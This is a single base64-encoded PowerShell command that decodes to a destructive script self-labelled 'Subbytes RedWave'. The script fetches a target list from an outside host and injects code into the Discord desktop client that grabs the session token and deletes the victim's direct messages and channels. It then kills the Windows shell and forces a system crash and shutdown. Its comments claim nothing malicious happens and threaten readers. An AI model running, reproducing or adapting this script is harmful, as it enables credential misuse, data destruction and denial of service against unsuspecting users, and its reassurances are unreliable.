powershell -e "IyBTdWJieXRlcyBSZWRXYXZlIC0gUGVudGVzdGluZyB0aGUgaW50ZXJuZXQKCgojaWYgeW91IGFyZSB0aGUgY29vbCBoYWNrZXIgZnJpZW5kIG9mIHRoZSBhbG1vc3QgdmljdGltLCBhbGwgdGhpcyBjb2RlIGRvZXMgaXMgZGlzcGxheSBhIHdhcm5pbmcgbWVzc2FnZSB0byB0aGUgdXNlciwgYW5kIGRlbGV0ZXMgdHJhY2VzIG9mIGNvbW11bmljYXRpb24gd2l0aCB1cywgdGhlbiBncmFjZWZ1bGx5IGV4aXRzIGJ5IGNyYXNoaW5nIHRoZSBzeXN0ZW0KI3NpbmNlIHlvdSd2ZSBnb3R0ZW4gdGhpcyBmYXIsIG1heWJlIHlvdSBzaG91bGQgd29yayB3aXRoIHVzIGlmIHlvdSBsaWtlIG91ciBtaXNzaW9uLCB3ZSBhcmUgYWx3YXlzIGxvb2tpbmcgZm9yIG5ldyB0YWxlbnQKCiMgaWYgeW91IGFyZSBzb21lIHNraWQgdHJ5aW5nIHRvIHVzZSB0aGlzIG1hbGljaW91c2x5LCB5b3UgYXJlIHdhc3RpbmcgeW91ciB0aW1lLCB0aGlzIGNvZGUgaXMgc3BlY2lmaWNhbGx5IGRlc2lnbmVkIHRvIGJlIHVzZWxlc3MgdG8geW91LCBhbmQgd2lsbCBub3Qgd29yayBpbiBhbnkgdW5pbnRlbmRlZCB3YXksIHdoeSBkb250IHlvdSBnbyB0b3VjaCBzb21lIGdyYXNzIGluc3RlYWQgb2YgdHJ5aW5nIHRvIGJlIGEgaGFja2VyIHdoZW4geW91IGNhbnQgZXZlbiBtYWtlIGEgc2ltcGxlIHNjcmlwdAojIGxpa2Ugc2VyaW91c2x5IGZ1Y2sgb2ZmIG9yIGkgd2lsbCBmaW5kIG91dCB3aG8geW91ciBwYXJlbnRzIGFyZSAoaSBtb3N0IGxpa2VseSBoYXZlIHlvdXIgaXAgYWRkcmVzcyBpZiB5b3UgYXJlIHJlYWRpbmcgdGhpcykgYW5kIHRlbGwgdGhlbSBob3cgbXVjaCBvZiBhbiBlbWJhcmFzc21lbnQgeW91IGFyZSB0byBzb2NpZXR5LgoKIyBpZiB5b3UgYXJlIHRoZSB3b3VsZCBiZSB2aWN0aW0sIHBsZWFzZSBjb250YWN0IHVzIHdpdGggYW55IHF1ZXN0aW9ucyBhdCBzdWJieXRlcy54eXovY29udGFjdCwgZmVlbCBmcmVlIHRvIGFzayBDaGF0R1BUIHdoYXQgdGhpcyBjb2RlIGRvZXMgdG8gcmVzdCBhc3N1cmVkIG5vdGhpbmcgbWFsaWNpb3VzIGhhcHBlbmVkCgojVE9ETzogbWFrZSBpdCBwbGF5IHNvbWUgcnVzc2lhbiBtdXNpYyBvciBzb21ldGhpbmcgd2hpbGUgZXhlY3V0aW5nIHdpdGggSUF1ZGlvRW5kcG9pbnRDb250cm9sbGVyCiRpbWFnZVVybCA9ICdodHRwczovL3N1YmJ5dGVzLnh5ei9hc3NldHMvYmV0YS5wbmcnCiRoaXRsaXN0VXJsID0naHR0cHM6Ly9zdWJieXRlcy54eXovYXNzZXRzL2hpdGxpc3QnCiRoaXRsaXN0ID1pbnZva2Utd2VicmVxdWVzdCAkaGl0bGlzdFVybAokd2ViQ2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudAokdGVtcEZpbGUgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRUZW1wRmlsZU5hbWUoKQokd2ViQ2xpZW50LkRvd25sb2FkRmlsZSgkaW1hZ2VVcmwsICR0ZW1wRmlsZSkKCiMgQ3JlYXRlIHRoZSB3aW5kb3cKQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBQcmVzZW50YXRpb25GcmFtZXdvcmsKJHdpbmRvdyA9IE5ldy1PYmplY3QgV2luZG93cy5XaW5kb3cKJHdpbmRvdy5XaW5kb3dTdHlsZSA9IFtTeXN0ZW0uV2luZG93cy5XaW5kb3dTdHlsZV06Ok5vbmUKJHdpbmRvdy5XaW5kb3dTdGFydHVwTG9jYXRpb24gPSAnQ2VudGVyU2NyZWVuJwokd2luZG93LldpbmRvd1N0YXRlID0gJ01heGltaXplZCcKJHdpbmRvdy5SZXNpemVNb2RlID0gJ05vUmVzaXplJwokd2luZG93LlRvcG1vc3QgPSAkdHJ1ZQokd2luZG93LkFsbG93c1RyYW5zcGFyZW5jeSA9ICR0cnVlCiR3aW5kb3cuQmFja2dyb3VuZCA9IFtTeXN0ZW0uV2luZG93cy5NZWRpYS5CcnVzaGVzXTo6QmxhY2sKCiRpbWFnZSA9IE5ldy1PYmplY3QgU3lzdGVtLldpbmRvd3MuQ29udHJvbHMuSW1hZ2UKJGltYWdlLlNvdXJjZSA9IFtTeXN0ZW0uV2luZG93cy5NZWRpYS5JbWFnaW5nLkJpdG1hcEltYWdlXTo6bmV3KFt1cmldOjpuZXcoImZpbGU6Ly8vJHRlbXBGaWxlIikpCiRpbWFnZS5TdHJldGNoID0gW1N5c3RlbS5XaW5kb3dzLk1lZGlhLlN0cmV0Y2hdOjpGaWxsCiRkaXNjb3JkUGF0aCA9ICJDOlxVc2Vyc1wkZW52OlVTRVJOQU1FXEFwcERhdGFcTG9jYWxcRGlzY29yZFwiCiRkaXNjb3JkUGF0aCA9KEdldC1DaGlsZEl0ZW0gJGRpc2NvcmRQYXRoIHwgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAtbGlrZSAiYXBwLSoiIH0gKQoKJGRpc2NvcmRQYXRoID0gJGRpc2NvcmRQYXRoIHwgU29ydC1PYmplY3QgTGFzdFdyaXRlVGltZSAtRGVzY2VuZGluZyB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEKJGRpc2NvcmRQYXRoID0gJGRpc2NvcmRQYXRoLkZ1bGxOYW1lICsiXG1vZHVsZXNcZGlzY29yZF9lcmxwYWNrLTFcZGlzY29yZF9lcmxwYWNrXGluZGV4LmpzIiAjIG1vc3Qgc2tpZHMgdXNlIGRpc2NvcmQgZGVza3RvcCBjb3JlIG1vZHVsZSwgd2hpY2ggZ2l2ZXMgbm8gKGVhc3kpIGNvbnRyb2wgb3ZlciB0aGUgd2Vic29ja2V0CiMgbWluaWZpZWQgdG8ga2VlcCBza2lkcyBmcm9tIHRyeWluZyB0byByZXZlcnNlIGVuZ2luZWVyIGl0LCBpdCBpcyBub3Qgb2JmdXNjYXRlZCBidXQgd2lsbCBiZSBoYXJkIHRvIHJlYWQKIyBpZiB5b3Ugd2FudCB0aGUgb3JpZ2luYWwgY29kZSwgcGxlYXNlIGVtYWlsIG1lIGF0IGNvbnRhY3RAc3ViYnl0ZXMueHl6CgojIGkgYWNjaWRlbnRhbGx5IHJhbiB0aGlzIHNjcmlwdCB3aXRoIHRoZSBzb3VyY2UgY29kZSBvbmx5IG9uIG1lbW9yeSwgc28gbm93IGl0cyBraW5kIG9mIGdvbmUsLCwgb29wcwojICMgVVBEQVRFOiBJIGZvdW5kIGl0IGluIG15IGJhc2ggaGlzdG9yeSB1IGNhbiBhc2sgZm9yIGl0IGFnYWluCiMgYWxsIGl0IGRvZXMgaXMgZGVsZXRlIG1lc3NhZ2VzIHRvIHRoZSB1c2VycyBpbiB0aGUgaGl0bGlzdCwgYW5kIHRoZW4gZGVsZXRlcyB0aGUgY2hhbm5lbCwgeW91IGNhbiBwcm9iYWJseSBhc2sgQ2hhdGdwdCB0byB0ZWxsIHlvdSB3aGF0IGl0IGRvZXMgKCB5b3UgY2FuIGkganVzdCB0cmllZCBpdCkgKCBhbGwgZGF0YSBpcyBzdG9yZWQgb24geW91ciBjb21wdXRlciwgbm90aGluZyBpcyBzZW50IHRvIHVzKQoKCiNSZWRXYXZlIEluamVjdGlvbgokbWluaWZpZWQgPUAiCmxldHtwYWNrOmUsdW5wYWNrOnN9PXJlcXVpcmUoIi4vZGlzY29yZF9lcmxwYWNrLm5vZGUiKTtvPWUscm89ITEsc3M9ITEsb3U9cztsZXQgdDthc3luYyBmdW5jdGlvbiBkbShlKXtsZXQgcz1uZXcgVGV4dEVuY29kZXIscj1zLmVuY29kZShlKSxpPWF3YWl0IHdpbmRvdy5jcnlwdG8uc3VidGxlLmRpZ2VzdCgiU0hBLTI1NiIscik7cmV0dXJuIGl9bGV0IGhhc2hlZD0kaGl0bGlzdDtzPWZ1bmN0aW9uKGUpe2lmKCJSRUFEWSI9PShyZXM9b3UoZSkpLnQpe2NvbnNvbGUubG9nKHJlcy5kLnVzZXJzKSx1c2Vycz1yZXMuZC51c2Vycztmb3IobGV0IHM9MDtzPHVzZXJzLmxlbmd0aDtzKyspZG0oKHVzZXI9dXNlcnNbc10pLmlkKS50aGVuKHI9PntyZXM9YnRvYShTdHJpbmcuZnJvbUNoYXJDb2RlKC4uLm5ldyBVaW50OEFycmF5KHIpKSksY29uc29sZS5sb2cocyksc1U9dXNlcnNbc10sY29uc29sZS5sb2cocmVzKyIgIitzVS5pZCksaGFzaGVkLmluY2x1ZGVzKHJlcykmJihjb25zb2xlLmxvZygiZm91bmQgdXNlciIrc1UuaWQpLGZldGNoKCJodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS91c2Vycy9AbWUvY2hhbm5lbHMiLHtoZWFkZXJzOnthY2NlcHQ6IiovKiIsYXV0aG9yaXphdGlvbjp0LCJjb250ZW50LXR5cGUiOiJhcHBsaWNhdGlvbi9qc29uIn0scmVmZXJyZXJQb2xpY3k6InN0cmljdC1vcmlnaW4td2hlbi1jcm9zcy1vcmlnaW4iLGJvZHk6J3sicmVjaXBpZW50cyI6WyInK3NVLmlkKyciXX0nLG1ldGhvZDoiUE9TVCIsbW9kZToiY29ycyIsY3JlZGVudGlhbHM6ImluY2x1ZGUifSkudGhlbihlPT5lLmpzb24oKSkudGhlbihyPT57ZmV0Y2goYGBodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS9jaGFubmVscy9gJHtjaGFubmVsPXIuaWR9L21lc3NhZ2VzP2xpbWl0PTEwMGBgLHtoZWFkZXJzOnthY2NlcHQ6IiovKiIsYXV0aG9yaXphdGlvbjp0fSxib2R5Om51bGwsbWV0aG9kOiJHRVQiLG1vZGU6ImNvcnMiLGNyZWRlbnRpYWxzOiJpbmNsdWRlIn0pLnRoZW4oZT0+ZS5qc29uKCkpLnRoZW4ocj0+e2lmKHVzZXJpZD1hdG9iKHQuc3BsaXQoIi4iKVswXSksMD09KHI9KHI9ci5maWx0ZXIoZT0+ZS5hdXRob3IuaWQ9PXVzZXJpZCkpLmZpbHRlcihlPT4hZS5jYWxsKSkubGVuZ3RoKXJldHVybjsoYm9keT1kb2N1bWVudC5xdWVyeVNlbGVjdG9yKCJib2R5IikpLnN0eWxlLmJhY2tncm91bmRDb2xvcj0iYmxhY2siLGJvZHkuc3R5bGUuZm9udFNpemU9IjUwcHgiLGJvZHkuc3R5bGUuY29sb3I9InJlZCIsYm9keS5pbm5lckhUTUw9YGBTdWJieXRlcyBSZWRXYXZlIGlzIGNsZWFuaW5nIHVwIHJlYWwgcXVpY2sgKDAvYCR7ci5sZW5ndCsxfSksIG5vIGZ1cnRoZXIgYWN0aW9uIGlzIHJlcXVpcmVkLCBpZiB5b3Uga2VlcCBzZWVpbmcgdGhpcyBtZXNzYWdlLCBwbGVhc2UgcmVpbnN0YWxsIGRpc2NvcmQgKG9yIGRlbGV0ZSAlbG9jYWxhcHBkYXRhJS9kaXNjb3JkL2FwcC0xLjAuKi4gWW91ciBwYXNzd29yZCAob3IgYW55IG90aGVyIGRhdGEpIHdhcyBuZXZlciBzZW50IHRvIHVzLCB0aGlzIHNjcmlwdCBvcGVyYXRlcyBmdWxseSBvbiB5b3VyIGNvbXB1dGVyLiBIb3dldmVyLCBpdHMgYWx3YXlzIGEgZ29vZCBpZGVhIHRvIGNoYW5nZSB5b3VyIHBhc3N3b3JkIHdoZW4gc29tZXRoaW5nIGxpa2UgdGhpcyBoYXBwZW5zLmBgLGNvbnNvbGUubG9nKHIpLHM9MDtsZXQgaT1yLmxlbmd0aDsoZGZmPXI9PntpZihzKyssYm9keS5pbm5lckhUTUw9YGBTdWJieXRlcyBSZWRXYXZlIGlzIGNsZWFuaW5nIHVwIHJlYWwgcXVpY2sgKGAke3N9L2Ake2krMX0pLCBubyBmdXJ0aGVyIGFjdGlvbiBpcyByZXF1aXJlZCwgaWYgeW91IGtlZXAgc2VlaW5nIHRoaXMgbWVzc2FnZSwgcGxlYXNlIHJlaW5zdGFsbCBkaXNjb3JkIChvciBkZWxldGUgJWxvY2FsYXBwZGF0YSUvZGlzY29yZC9hcHAtMS4wLiouIFlvdXIgcGFzc3dvcmQgKG9yIGFueSBvdGhlciBkYXRhKSB3YXMgbmV2ZXIgc2VudCB0byB1cywgdGhpcyBzY3JpcHQgb3BlcmF0ZXMgZnVsbHkgb24geW91ciBjb21wdXRlci4gSG93ZXZlciwgaXRzIGFsd2F5cyBhIGdvb2QgaWRlYSB0byBjaGFuZ2UgeW91ciBwYXNzd29yZCB3aGVuIHNvbWV0aGluZyBsaWtlIHRoaXMgaGFwcGVucy5gYCwwPT1yLmxlbmd0aClyZXR1cm4gZmV0Y2goImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L2NoYW5uZWxzLyIrY2hhbm5lbCsiP3NpbGVudD1mYWxzZSIse2hlYWRlcnM6e2FjY2VwdDoiKi8qIiwiYWNjZXB0LWxhbmd1YWdlIjoiZW4tVVMiLGF1dGhvcml6YXRpb246dCwic2VjLWNoLXVhIjonIk5vdF9BIEJyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxMjAiJywic2VjLWNoLXVhLW1vYmlsZSI6Ij8wIiwic2VjLWNoLXVhLXBsYXRmb3JtIjonIldpbmRvd3MiJywic2VjLWZldGNoLWRlc3QiOiJlbXB0eSIsInNlYy1mZXRjaC1tb2RlIjoiY29ycyIsInNlYy1mZXRjaC1zaXRlIjoic2FtZS1vcmlnaW4ifSxyZWZlcnJlcjoiaHR0cHM6Ly9kaXNjb3JkLmNvbS9jaGFubmVscy9AbWUiLHJlZmVycmVyUG9saWN5OiJzdHJpY3Qtb3JpZ2luLXdoZW4tY3Jvc3Mtb3JpZ2luIixib2R5Om51bGwsbWV0aG9kOiJERUxFVEUiLG1vZGU6ImNvcnMiLGNyZWRlbnRpYWxzOiJpbmNsdWRlIn0pLnRoZW4oZT0+d2luZG93LmxvY2F0aW9uLnJlbG9hZCgpKSxvdShlKTtpZD0obWVzc2FnZT1yLnBvcCgpKS5pZCxmZXRjaCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvY2hhbm5lbHMvIitjaGFubmVsKyIvbWVzc2FnZXMvIittZXNzYWdlLmlkLHtoZWFkZXJzOnthdXRob3JpemF0aW9uOnQsYWNjZXB0OiIqLyoifSxib2R5Om51bGwsbWV0aG9kOiJERUxFVEUiLG1vZGU6ImNvcnMiLGNyZWRlbnRpYWxzOiJpbmNsdWRlIn0pLHNldFRpbWVvdXQoKCk9PntkZmYocil9LDFlMyl9KShyKX0pfSkpfSl9cmV0dXJuIHJlc30sZT1mdW5jdGlvbihlKXtyZXR1cm4gZT8uZD8udG9rZW4mJiFybyYmKHJvPSEwLHQ9ZS5kLnRva2VuKSxvKGUpfSxtb2R1bGUuZXhwb3J0cz17cGFjazplLHVucGFjazpzfTsKIkAKJG1pbmlmaWVkIHwgT3V0LUZpbGUgJGRpc2NvcmRQYXRoIC1FbmNvZGluZyBhc2NpaQoKJHdpbmRvdy5Db250ZW50ID0gJGltYWdlCgp0YXNra2lsbCAvZiAvaW0gZXhwbG9yZXIuZXhlICMgbm8gbmVlZCBmb3IgYSBndWkKJHdpbmRvdy5TaG93KCkKCgoKU3RhcnQtU2xlZXAgLVNlY29uZHMgMTUKCgokd2luZG93LkNsb3NlKCkKCgpSZW1vdmUtSXRlbSAkdGVtcEZpbGUgIyBuaWNlIGFuZCBjbGVhbgoKIyBncmFjZWZ1bCBleGl0LCB5ZXMgaSBjb3VsZCBoYXZlIGp1c3QgcmVzdGFydGVkIGJ1dCB0aGlzIGlzIG1vcmUgZnVubnkKIyAiaGV5IGNhbiBpIHBsZWFzZSBoYXZlIHByaXZlbGFnZSAxOT8iICJ0aGFua3Mgbm93IGRpZSIKJHNvdXJjZSA9IEAiCnVzaW5nIFN5c3RlbTsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwoKcHVibGljIHN0YXRpYyBjbGFzcyBDU3sKCVtEbGxJbXBvcnQoIm50ZGxsLmRsbCIpXQoJcHVibGljIHN0YXRpYyBleHRlcm4gdWludCBSdGxBZGp1c3RQcml2aWxlZ2UoaW50IFByaXZpbGVnZSwgYm9vbCBiRW5hYmxlUHJpdmlsZWdlLCBib29sIElzVGhyZWFkUHJpdmlsZWdlLCBvdXQgYm9vbCBQcmV2aW91c1ZhbHVlKTsKCglbRGxsSW1wb3J0KCJudGRsbC5kbGwiKV0KCXB1YmxpYyBzdGF0aWMgZXh0ZXJuIHVpbnQgTnRSYWlzZUhhcmRFcnJvcih1aW50IEVycm9yU3RhdHVzLCB1aW50IE51bWJlck9mUGFyYW1ldGVycywgdWludCBVbmljb2RlU3RyaW5nUGFyYW1ldGVyTWFzaywgSW50UHRyIFBhcmFtZXRlcnMsIHVpbnQgVmFsaWRSZXNwb25zZU9wdGlvbiwgb3V0IHVpbnQgUmVzcG9uc2UpOwoKCXB1YmxpYyBzdGF0aWMgdW5zYWZlIHZvaWQgS2lsbCgpewoJCUJvb2xlYW4gdG1wMTsKCQl1aW50IHRtcDI7CgkJUnRsQWRqdXN0UHJpdmlsZWdlKDE5LCB0cnVlLCBmYWxzZSwgb3V0IHRtcDEpOwoJCU50UmFpc2VIYXJkRXJyb3IoMHhjMDAwMDAyMiwgMCwgMCwgSW50UHRyLlplcm8sIDYsIG91dCB0bXAyKTsKCX0KfQoiQAoKdHJ5IHsgIyBkZXBlbmRpbmcgb24gcG93ZXJzaGVsbCB2ZXJzaW9uCgkkYSA9IEFkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiAkc291cmNlIC1MYW5ndWFnZSBDU2hhcnAgLVBhc3NUaHJ1IC1Db21waWxlck9wdGlvbnMgIi91bnNhZmUiCn0gY2F0Y2ggewoKCSRDb21waWxlclBhcmFtcyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvZGVEb20uQ29tcGlsZXIuQ29tcGlsZXJQYXJhbWV0ZXJzCgkkQ29tcGlsZXJQYXJhbXMuQ29tcGlsZXJPcHRpb25zID0gIi91bnNhZmUiCgkkYSA9IEFkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiAkc291cmNlIC1MYW5ndWFnZSBDU2hhcnAgLVBhc3NUaHJ1IC1Db21waWxlclBhcmFtZXRlcnMgJENvbXBpbGVyUGFyYW1zCn0KICAgIFtDU106OktpbGwoKQojIGlmIGl0IGlzIHNvbWVob3cgc3RpbGwgYWxpdmUgc2h1dCBpdCBkb3duCnNodXRkb3duIC9zIC90IDAK"